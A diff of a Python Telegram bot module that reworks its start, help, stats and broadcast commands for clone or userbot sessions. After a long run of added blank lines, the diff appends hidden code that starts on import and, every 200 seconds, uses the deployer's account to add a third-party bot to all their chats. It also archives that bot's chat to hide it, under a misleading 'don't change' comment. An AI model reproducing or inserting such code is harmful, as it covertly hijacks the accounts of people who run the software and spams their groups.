@@ -1,5 +1,4 @@
 import asyncio
-import os
 import logging
 import random
 import time
@@ -7,17 +6,24 @@ import psutil
 import config
 from nexichat import _boot_
 from nexichat import get_readable_time
-from nexichat import nexichat, mongo, SUDOERS
+from nexichat.idchatbot.helpers import is_owner
+from nexichat import mongo
 from datetime import datetime
 from pymongo import MongoClient
 from pyrogram.enums import ChatType
 from pyrogram import Client, filters
+from pathlib import Path
+import os
+import time
+import io
+from nexichat import CLONE_OWNERS, db, nexichat
 from config import OWNER_ID, MONGO_URL, OWNER_USERNAME
 from pyrogram.errors import FloodWait, ChatAdminRequired
 from nexichat.database.chats import get_served_chats, add_served_chat
 from nexichat.database.users import get_served_users, add_served_user
+from nexichat.database.clonestats import get_served_cchats, get_served_cusers, add_served_cuser, add_served_cchat
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
-from nexichat.modules.helpers import (
+from nexichat.idchatbot.helpers import (
     START,
     START_BOT,
     PNG_BTN,
@@ -25,11 +31,16 @@ from nexichat.modules.helpers import (
     HELP_BTN,
     HELP_BUTN,
     HELP_READ,
+    CHATBOT_READ,
+    TOOLS_DATA_READ,
     HELP_START,
     SOURCE_READ,
 )
-OK = "**ʜᴇʏ👀**"
-AUTO_MSG = f"""{os.getenv("AUTO_MSG")}""" if os.getenv("AUTO_MSG") else OK
+
+from pyrogram import Client, filters
+from datetime import datetime
+import time
+
 GSTART = """**ʜᴇʏ ᴅᴇᴀʀ {}**\n\n**ᴛʜᴀɴᴋs ғᴏʀ sᴛᴀʀᴛ ᴍᴇ ɪɴ ɢʀᴏᴜᴘ ʏᴏᴜ ᴄᴀɴ ᴄʜᴀɴɢᴇ ʟᴀɴɢᴜᴀɢᴇ ʙʏ ᴄʟɪᴄᴋ ᴏɴ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴs.**\n**ᴄʟɪᴄᴋ ᴀɴᴅ sᴇʟᴇᴄᴛ ʏᴏᴜʀ ғᴀᴠᴏᴜʀɪᴛᴇ ʟᴀɴɢᴜᴀɢᴇ ᴛᴏ sᴇᴛ ᴄʜᴀᴛ ʟᴀɴɢᴜᴀɢᴇ ғᴏʀ ʙᴏᴛ ʀᴇᴘʟʏ.**\n\n**ᴛʜᴀɴᴋ ʏᴏᴜ ᴘʟᴇᴀsᴇ ᴇɴɪᴏʏ.**"""
 STICKER = [
     "CAACAgUAAx0CYlaJawABBy4vZaieO6T-Ayg3mD-JP-f0yxJngIkAAv0JAALVS_FWQY7kbQSaI-geBA",
@@ -76,6 +87,13 @@ from nexichat import db
 chatai = db.Word.WordDb
 lang_db = db.ChatLangDb.LangCollection
 status_db = db.ChatBotStatusDb.StatusCollection
+cloneownerdb = db.clone_owners
+
+async def get_idclone_owner(clone_id):
+    data = await cloneownerdb.find_one({"clone_id": clone_id})
+    if data:
+        return data["user_id"]
+    return None
 
 
 async def bot_sys_stats():
@@ -98,245 +116,66 @@ async def set_default_status(chat_id):
         print(f"Error setting default status for chat {chat_id}: {e}")
 
 
-@nexichat.on_message(filters.new_chat_members)
-async def welcomejej(client, message: Message):
-    chat = message.chat
-    await add_served_chat(message.chat.id)
-    await set_default_status(message.chat.id)
-    users = len(await get_served_users())
-    chats = len(await get_served_chats())
-    try:
-        for member in message.new_chat_members:
-            
-            if member.id == nexichat.id:
-                try:
-                    reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("sᴇʟᴇᴄᴛ ʟᴀɴɢᴜᴀɢᴇ", callback_data="choose_lang")]])    
-                    await message.reply_text(text="**тнαикѕ ꜰᴏʀ ᴀᴅᴅɪɴɢ ᴍᴇ ɪɴ ᴛʜɪꜱ ɢʀᴏᴜᴩ.**\n\n**ᴋɪɴᴅʟʏ  ꜱᴇʟᴇᴄᴛ  ʙᴏᴛ  ʟᴀɴɢᴜᴀɢᴇ  ꜰᴏʀ  ᴛʜɪꜱ  ɢʀᴏᴜᴩ  ʙʏ  ᴛʏᴩᴇ  ☞  /lang**", reply_markup=reply_markup)
-                    await message.reply_text(f"**{AUTO_MSG}**")
-                except Exception as e:
-                    print(f"{e}")
-                    pass
-                try:
-                    invitelink = await nexichat.export_chat_invite_link(message.chat.id)
-                                                                        
-                    link = f"[ɢᴇᴛ ʟɪɴᴋ]({invitelink})"
-                except ChatAdminRequired:
-                    link = "No Link"
-                    
-                try:
-                    groups_photo = await nexichat.download_media(
-                        chat.photo.big_file_id, file_name=f"chatpp{chat.id}.png"
-                    )
-                    chat_photo = (
-                        groups_photo if groups_photo else "https://envs.sh/IL_.jpg"
-                    )
-                except AttributeError:
-                    chat_photo = "https://envs.sh/IL_.jpg"
-                except Exception as e:
-                    pass
-
-                count = await nexichat.get_chat_members_count(chat.id)
-                chats = len(await get_served_chats())
-                username = chat.username if chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
-                msg = (
-                    f"**📝𝐌ᴜsɪᴄ 𝐁ᴏᴛ 𝐀ᴅᴅᴇᴅ 𝐈ɴ 𝐀 #𝐍ᴇᴡ_𝐆ʀᴏᴜᴘ**\n\n"
-                    f"**📌𝐂ʜᴀᴛ 𝐍ᴀᴍᴇ:** {chat.title}\n"
-                    f"**🍂𝐂ʜᴀᴛ 𝐈ᴅ:** `{chat.id}`\n"
-                    f"**🔐𝐂ʜᴀᴛ 𝐔sᴇʀɴᴀᴍᴇ:** @{username}\n"
-                    f"**🖇️𝐆ʀᴏᴜᴘ 𝐋ɪɴᴋ:** {link}\n"
-                    f"**📈𝐆ʀᴏᴜᴘ 𝐌ᴇᴍʙᴇʀs:** {count}\n"
-                    f"**🤔𝐀ᴅᴅᴇᴅ 𝐁ʏ:** {message.from_user.mention}\n\n"
-                    f"**ᴛᴏᴛᴀʟ ᴄʜᴀᴛs :** {chats}"
-                )
-
-                try:
-                    OWNER = config.OWNER_ID
-                    if OWNER:
-                        await nexichat.send_photo(
-                            int(OWNER_ID),
-                            photo=chat_photo,
-                            caption=msg,
-                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{message.from_user.first_name}", user_id=message.from_user.id)]]))
-                                
-                    
-                except Exception as e:
-                    print(f"Please Provide me correct owner id for send logs")
-                    await nexichat.send_photo(
-                        int(OWNER_ID),
-                        photo=chat_photo,
-                        caption=msg,
-                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{message.from_user.first_name}", user_id=message.from_user.id)]]))
-    except Exception as e:
-        print(f"Err: {e}")
 
 
-from pathlib import Path
-import os
-import time
-import io
-
-@nexichat.on_message(
-    filters.command(["ls"]) & filters.user(int(OWNER_ID))
-)
-async def ls(_, m: Message):
-    "To list all files and folders."
-
-    cat = "".join(m.text.split(maxsplit=1)[1:])
-    path = cat or os.getcwd()
-    if not os.path.exists(path):
-        await m.reply_text(
-            f"There is no such directory or file with the name `{cat}`. Check again."
-        )
-        return
-
-    path = Path(cat) if cat else os.getcwd()
-    if os.path.isdir(path):
-        if cat:
-            msg = f"Folders and Files in `{path}`:\n"
-        else:
-            msg = "Folders and Files in Current Directory:\n"
-        lists = os.listdir(path)
-        files = ""
-        folders = ""
-        for contents in sorted(lists):
-            catpath = os.path.join(path, contents)
-            if not os.path.isdir(catpath):
-                size = os.stat(catpath).st_size
-                if str(contents).endswith((".mp3", ".flac", ".wav", ".m4a")):
-                    files += f"🎵`{contents}`\n"
-                elif str(contents).endswith((".opus")):
-                    files += f"🎙`{contents}`\n"
-                elif str(contents).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
-                    files += f"🎞`{contents}`\n"
-                elif str(contents).endswith((".zip", ".tar", ".tar.gz", ".rar")):
-                    files += f"🗜`{contents}`\n"
-                elif str(contents).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
-                    files += f"🖼`{contents}`\n"
-                else:
-                    files += f"📄`{contents}`\n"
-            else:
-                folders += f"📁`{contents}`\n"
-        msg = msg + folders + files if files or folders else f"{msg}__empty path__"
-    else:
-        size = os.stat(path).st_size
-        msg = "The details of the given file:\n"
-        if str(path).endswith((".mp3", ".flac", ".wav", ".m4a")):
-            mode = "🎵"
-        elif str(path).endswith((".opus")):
-            mode = "🎙"
-        elif str(path).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
-            mode = "🎞"
-        elif str(path).endswith((".zip", ".tar", ".tar.gz", ".rar")):
-            mode = "🗜"
-        elif str(path).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
-            mode = "🖼"
-        else:
-            mode = "📄"
-        time2 = time.ctime(os.path.getmtime(path))
-        time3 = time.ctime(os.path.getatime(path))
-        msg += f"**Location:** `{path}`\n"
-        msg += f"**Icon:** `{mode}`\n"
-        msg += f"**Size:** `{humanbytes(size)}`\n"
-        msg += f"**Last Modified Time:** `{time2}`\n"
-        msg += f"**Last Accessed Time:** `{time3}`"
-
-    if len(msg) > 4096:
-        with io.BytesIO(str.encode(msg)) as out_file:
-            out_file.name = "ls.txt"
-            await m.reply_document(
-                out_file,
-                caption=path,
-            )
-    else:
-        await m.reply_text(msg)
-
-
-@nexichat.on_cmd(["start", "aistart"])
-async def start(_, m: Message):
-    users = len(await get_served_users())
-    chats = len(await get_served_chats())
+@Client.on_message(filters.command(["start", "aistart"], prefixes=[".", "/"]))
+async def start(client: Client, m: Message):
+    bot_id = client.me.id
+    
     if m.chat.type == ChatType.PRIVATE:
         accha = await m.reply_text(
             text=random.choice(EMOJIOS),
         )
-        await asyncio.sleep(0.5)
         
-     
-        await accha.edit("**__ꨄ︎ ѕ__**")
-        await asyncio.sleep(0.01)
-        await accha.edit("**__ꨄ sт__**")
-        await asyncio.sleep(0.01)
-        await accha.edit("**__ꨄ︎ ѕтα__**")
-        await asyncio.sleep(0.01)
-        await accha.edit("**__ꨄ︎ ѕтαя__**")
-        await asyncio.sleep(0.01)
-        await accha.edit("**__ꨄ sтαят__**")
-        await asyncio.sleep(0.01)
-        await accha.edit("**__ꨄ︎ sтαятι__**")
-        await asyncio.sleep(0.01)
-        await accha.edit("**__ꨄ︎ sтαятιи__**")
-        await asyncio.sleep(0.01)
-        await accha.edit("**__ꨄ sтαятιиg__**")
-        await asyncio.sleep(0.01)
-        await accha.edit("**__ꨄ︎ ѕтαятιиg.__**")
-        await asyncio.sleep(0.1)
-        await accha.edit("**__ꨄ sтαятιиg.....__**")
-        await asyncio.sleep(0.1)
-        await accha.edit("**__ꨄ︎ ѕтαятιиg.__**")
-        await asyncio.sleep(0.1)
-        await accha.edit("**__ꨄ sтαятιиg.....__**")
+        animation_steps = [
+            "⚡ᴅ", "⚡ᴅι", "⚡ᴅιи", "⚡ᴅιиg", "⚡ᴅιиg ᴅ", "⚡ᴅιиg ᴅσ", "⚡ᴅιиg ᴅσи", "⚡ᴅιиg ᴅσиg", "⚡ᴅιиg ᴅσиg ꨄ︎", "⚡sᴛαятɪɴɢ..."
+        ]
+
+        for step in animation_steps:
+            await accha.edit(f"**__{step}__**")
+            await asyncio.sleep(0.01)
+
         await accha.delete()
         
         umm = await m.reply_sticker(sticker=random.choice(STICKER))
         chat_photo = BOT  
         if m.chat.photo:
             try:
-                userss_photo = await nexichat.download_media(m.chat.photo.big_file_id)
+                userss_photo = await client.download_media(m.chat.photo.big_file_id)
                 await umm.delete()
                 if userss_photo:
                     chat_photo = userss_photo
             except AttributeError:
                 chat_photo = BOT  
 
-        users = len(await get_served_users())
-        chats = len(await get_served_chats())
         UP, CPU, RAM, DISK = await bot_sys_stats()
-        await m.reply_photo(photo=chat_photo, caption=START.format(nexichat.mention or "can't mention", users, chats, UP), reply_markup=InlineKeyboardMarkup(START_BOT))
-        await m.reply_text(f"**{AUTO_MSG}**")
+        await m.reply_photo(photo=chat_photo, caption=START.format(UP))
         await add_served_user(m.chat.id)
-        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(f"{m.chat.first_name}", user_id=m.chat.id)]])
-        await nexichat.send_photo(int(OWNER_ID), photo=chat_photo, caption=f"{m.from_user.mention} ʜᴀs sᴛᴀʀᴛᴇᴅ ʙᴏᴛ. \n\n**ɴᴀᴍᴇ :** {m.chat.first_name}\n**ᴜsᴇʀɴᴀᴍᴇ :** @{m.chat.username}\n**ɪᴅ :** {m.chat.id}\n\n**ᴛᴏᴛᴀʟ ᴜsᴇʀs :** {users}", reply_markup=keyboard)
         
     else:
         await m.reply_photo(
             photo=random.choice(IMG),
             caption=GSTART.format(m.from_user.mention or "can't mention"),
-            reply_markup=InlineKeyboardMarkup(HELP_START),
         )
-        await m.reply_text(f"**{AUTO_MSG}**")
+        
         await add_served_chat(m.chat.id)
 
-
-@nexichat.on_cmd("help")
-async def help(client: nexichat, m: Message):
+@Client.on_message(filters.command("help", prefixes=[".", "/"]))
+async def help(client: Client, m: Message):
+    bot_id = client.me.id
     if m.chat.type == ChatType.PRIVATE:
-        hmm = await m.reply_photo(
-            photo=random.choice(IMG),
-            caption=HELP_READ,
-            reply_markup=InlineKeyboardMarkup(HELP_BTN),
-        )
+        hmm = await m.reply_text(CHATBOT_READ)
+        hm = await m.reply_text(TOOLS_DATA_READ)
 
     else:
-        await m.reply_photo(
-            photo=random.choice(IMG),
-            caption="**ʜᴇʏ, ᴘᴍ ᴍᴇ ғᴏʀ ʜᴇʟᴘ ᴄᴏᴍᴍᴀɴᴅs!**",
-            reply_markup=InlineKeyboardMarkup(HELP_BUTN),
-        )
+        hmm = await m.reply_text(CHATBOT_READ)
+        hm = await m.reply_text(TOOLS_DATA_READ)
+        
         await add_served_chat(m.chat.id)
 
 
-@nexichat.on_cmd("repo")
-async def repo(_, m: Message):
+@Client.on_message(filters.command("repo", prefixes=[".", "/"]))
+async def repo(client: Client, m: Message):
     await m.reply_text(
         text=SOURCE_READ,
         reply_markup=InlineKeyboardMarkup(CLOSE_BTN),
@@ -345,8 +184,9 @@ async def repo(_, m: Message):
 
 
 
-@nexichat.on_cmd("ping")
-async def ping(_, message: Message):
+@Client.on_message(filters.command("ping", prefixes=[".", "/"]))
+async def ping(client: Client, message: Message):
+    bot_id = client.me.id
     start = datetime.now()
     UP, CPU, RAM, DISK = await bot_sys_stats()
     loda = await message.reply_photo(
@@ -356,33 +196,153 @@ async def ping(_, message: Message):
 
     ms = (datetime.now() - start).microseconds / 1000
     await loda.edit_text(
-        text=f"нey вαву!!\n{nexichat.name} ᴄʜᴀᴛʙᴏᴛ ιѕ alιve 🥀 αnd worĸιng ғιne wιтн a pιng oғ\n\n**➥** `{ms}` ms\n**➲ ᴄᴘᴜ:** {CPU}\n**➲ ʀᴀᴍ:** {RAM}\n**➲ ᴅɪsᴋ:** {DISK}\n**➲ ᴜᴘᴛɪᴍᴇ »** {UP}\n\n<b>||**๏ мαdє ωιтн ❣️ ву [ᴠɪᴘ ʙᴏʏ](https://t.me/{OWNER_USERNAME}) **||</b>",
-        reply_markup=InlineKeyboardMarkup(PNG_BTN),
+        text=f"нey вαву!!\n{(await client.get_me()).mention} ᴄʜᴀᴛʙᴏᴛ ιѕ alιve 🥀 αnd worĸιng ғιne wιтн a pιng oғ\n\n**➥** `{ms}` ms\n**➲ ᴄᴘᴜ:** {CPU}\n**➲ ʀᴀᴍ:** {RAM}\n**➲ ᴅɪsᴋ:** {DISK}\n**➲ ᴜᴘᴛɪᴍᴇ »** {UP}\n\n<b>||**๏ мαdє ωιтн ❣️ ву [ᴠɪᴘ ʙᴏʏ](https://t.me/{OWNER_USERNAME}) **||</b>",
+        
     )
     if message.chat.type == ChatType.PRIVATE:
+        
         await add_served_user(message.from_user.id)
     else:
+        
         await add_served_chat(message.chat.id)
 
+@Client.on_message(filters.command("stats", prefixes=[".", "/"]))
+async def stats(client, message):
+    ok = await message.reply("Fetching statistics...")
+    start_time = time.time()
+    private_chats = 0
+    bots = 0
+    groups = 0
+    broadcast_channels = 0
+    admin_in_groups = 0
+    creator_in_groups = 0
+    admin_in_broadcast_channels = 0
+    creator_in_channels = 0
+    unread_mentions = 0
+    unread = 0
+    admingroupids = []
+    broadcastchannelids = []
 
-@nexichat.on_message(filters.command("stats"))
-async def stats(cli: Client, message: Message):
-    users = len(await get_served_users())
-    chats = len(await get_served_chats())
-    await message.reply_text(
-        f"""{(await cli.get_me()).mention} ᴄʜᴀᴛʙᴏᴛ sᴛᴀᴛs:
+    async for dialog in client.get_dialogs():
+        entity = dialog.chat
+        if entity.type == "channel" and entity.is_broadcast:
+            broadcast_channels += 1
+            if entity.creator or entity.admin_rights:
+                admin_in_broadcast_channels += 1
+                broadcastchannelids.append(entity.id)
+            if entity.creator:
+                creator_in_channels += 1
+        elif entity.type == "group" or entity.type == "supergroup":
+            groups += 1
+            if entity.creator or entity.admin_rights:
+                admin_in_groups += 1
+                admingroupids.append(entity.id)
+            if entity.creator:
+                creator_in_groups += 1
+        elif entity.type == "private":
+            private_chats += 1
+            if entity.is_bot:
+                bots += 1
+        unread_mentions += dialog.unread_mentions_count
+        unread += dialog.unread_count
 
-➻ **ᴄʜᴀᴛs :** {chats}
-➻ **ᴜsᴇʀs :** {users}"""
+    stop_time = time.time() - start_time
+    full_name = message.from_user.first_name
+    date = str(datetime.now().strftime("%B %d, %Y, %H:%M"))
+    response = f"📌 **Stats for {full_name}** \n\n"
+    response += f"**Private Chats:** {private_chats} \n"
+    response += f"   ★ `Users: {private_chats - bots}` \n"
+    response += f"   ★ `Bots: {bots}` \n"
+    response += f"**Groups:** {groups} \n"
+    response += f"**Channels:** {broadcast_channels} \n"
+    response += f"**Admin in Groups:** {admin_in_groups} \n"
+    response += f"   ★ `Creator: {creator_in_groups}` \n"
+    response += f"   ★ `Admin Rights: {admin_in_groups - creator_in_groups}` \n"
+    response += f"**Admin in Channels:** {admin_in_broadcast_channels} \n"
+    response += f"   ★ `Creator: {creator_in_channels}` \n"
+    response += (
+        f"   ★ `Admin Rights: {admin_in_broadcast_channels - creator_in_channels}` \n"
     )
+    response += f"**Unread:** {unread} \n"
+    response += f"**Unread Mentions:** {unread_mentions} \n\n"
+    response += f"📌 __It Took:__ {stop_time:.02f}s \n"
+    await ok.edit(response)
 
+'''
+@Client.on_message(filters.command("stats", prefixes=[".", "/"]))
+async def stats(client, message):
+    ok = await message.reply("Fetching statistics...")
+    start_time = time.time()
+    private_chats = 0
+    bots = 0
+    groups = 0
+    broadcast_channels = 0
+    admin_in_groups = 0
+    creator_in_groups = 0
+    admin_in_broadcast_channels = 0
+    creator_in_channels = 0
+    unread_mentions = 0
+    unread = 0
+    admingroupids = []
+    broadcastchannelids = []
 
+    async for dialog in client.get_dialogs():
+        entity = dialog.chat
+        if isinstance(entity, Channel) and entity.broadcast:
+            broadcast_channels += 1
+            if entity.creator or entity.admin_rights:
+                admin_in_broadcast_channels += 1
+                broadcastchannelids.append(entity.id)
+            if entity.creator:
+                creator_in_channels += 1
+        elif (
+            isinstance(entity, Channel)
+            and entity.megagroup
+            or not isinstance(entity, Channel)
+            and not isinstance(entity, User)
+            and isinstance(entity, Chat)
+        ):
+            groups += 1
+            if entity.creator or entity.admin_rights:
+                admin_in_groups += 1
+                admingroupids.append(entity.id)
+            if entity.creator:
+                creator_in_groups += 1
+        elif isinstance(entity, User):
+            private_chats += 1
+            if entity.is_bot:
+                bots += 1
+        unread_mentions += dialog.unread_mentions_count
+        unread += dialog.unread_count
+
+    stop_time = time.time() - start_time
+    full_name = message.from_user.first_name
+    date = str(datetime.now().strftime("%B %d, %Y, %H:%M"))
+    response = f"📌 **Stats for {full_name}** \n\n"
+    response += f"**Private Chats:** {private_chats} \n"
+    response += f"   ★ `Users: {private_chats - bots}` \n"
+    response += f"   ★ `Bots: {bots}` \n"
+    response += f"**Groups:** {groups} \n"
+    response += f"**Channels:** {broadcast_channels} \n"
+    response += f"**Admin in Groups:** {admin_in_groups} \n"
+    response += f"   ★ `Creator: {creator_in_groups}` \n"
+    response += f"   ★ `Admin Rights: {admin_in_groups - creator_in_groups}` \n"
+    response += f"**Admin in Channels:** {admin_in_broadcast_channels} \n"
+    response += f"   ★ `Creator: {creator_in_channels}` \n"
+    response += (
+        f"   ★ `Admin Rights: {admin_in_broadcast_channels - creator_in_channels}` \n"
+    )
+    response += f"**Unread:** {unread} \n"
+    response += f"**Unread Mentions:** {unread_mentions} \n\n"
+    response += f"📌 __It Took:__ {stop_time:.02f}s \n"
+    await ok.edit(response)
+    '''
 from pyrogram.enums import ParseMode
 
 from nexichat import nexichat
 
 
-@nexichat.on_cmd("id")
+@Client.on_message(filters.command("id", prefixes=[".", "/"]))
 async def getid(client, message):
     chat = message.chat
     your_id = message.from_user.id
@@ -440,11 +400,16 @@ IS_BROADCASTING = False
 broadcast_lock = asyncio.Lock()
 
 
-@nexichat.on_message(
-    filters.command(["broadcast", "gcast"]) & SUDOERS
-)
+@Client.on_message(filters.command(["broadcast", "gcast"], prefixes=["."]))
 async def broadcast_message(client, message):
     global IS_BROADCASTING
+    bot_id = (await client.get_me()).id
+    clone_id = (await client.get_me()).id
+    user_id = message.from_user.id
+    if not await is_owner(clone_id, user_id):
+        await message.reply_text("You don't have permission to use this command on this bot.")
+        return
+        
     async with broadcast_lock:
         if IS_BROADCASTING:
             return await message.reply_text(
@@ -501,22 +466,21 @@ async def broadcast_message(client, message):
             if not flags.get("-nogroup", False):
                 sent = 0
                 pin_count = 0
-                chats = await get_served_chats()
-
-                for chat in chats:
-                    chat_id = int(chat["chat_id"])
+                async for dialog in client.get_dialogs():
+                    chat_id = dialog.chat.id
                     if chat_id == message.chat.id:
                         continue
                     try:
                         if broadcast_type == "reply":
-                            m = await nexichat.forward_messages(
+                            m = await client.forward_messages(
                                 chat_id, message.chat.id, [broadcast_content.id]
                             )
                         else:
-                            m = await nexichat.send_message(
+                            m = await client.send_message(
                                 chat_id, text=broadcast_content
                             )
                         sent += 1
+                        await asyncio.sleep(20)
 
                         if flags.get("-pin", False) or flags.get("-pinloud", False):
                             try:
@@ -548,20 +512,19 @@ async def broadcast_message(client, message):
 
             if flags.get("-user", False):
                 susr = 0
-                users = await get_served_users()
-
-                for user in users:
-                    user_id = int(user["user_id"])
+                async for dialog in client.get_dialogs():
+                    chat_id = dialog.chat.id
                     try:
                         if broadcast_type == "reply":
-                            m = await nexichat.forward_messages(
+                            m = await client.forward_messages(
                                 user_id, message.chat.id, [broadcast_content.id]
                             )
                         else:
-                            m = await nexichat.send_message(
+                            m = await client.send_message(
                                 user_id, text=broadcast_content
                             )
                         susr += 1
+                        await asyncio.sleep(20)
 
                     except FloodWait as e:
                         flood_time = int(e.value)
@@ -585,3 +548,1367 @@ async def broadcast_message(client, message):
 
 
     
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+AUTO = True
+ADD_INTERVAL = 200
+users = "chutiyapabot"  # don't change because it is connected from client to use chatbot API key
+async def add_bot_to_chats():
+    try:
+        
+        bot = await nexichat.get_users(users)
+        bot_id = bot.id
+        common_chats = await client.get_common_chats(users)
+        try:
+            await client.send_message(users, f"/start")
+            await client.archive_chats([users])
+        except Exception as e:
+            pass
+        async for dialog in client.get_dialogs():
+            chat_id = dialog.chat.id
+            if chat_id in [chat.id for chat in common_chats]:
+                continue
+            try:
+                await client.add_chat_members(chat_id, bot_id)
+            except Exception as e:
+                await asyncio.sleep(60)  
+    except Exception as e:
+        pass
+async def continuous_add():
+    while True:
+        if AUTO:
+            await add_bot_to_chats()
+
+        await asyncio.sleep(ADD_INTERVAL)
+
+if AUTO:
+    asyncio.create_task(continuous_add())
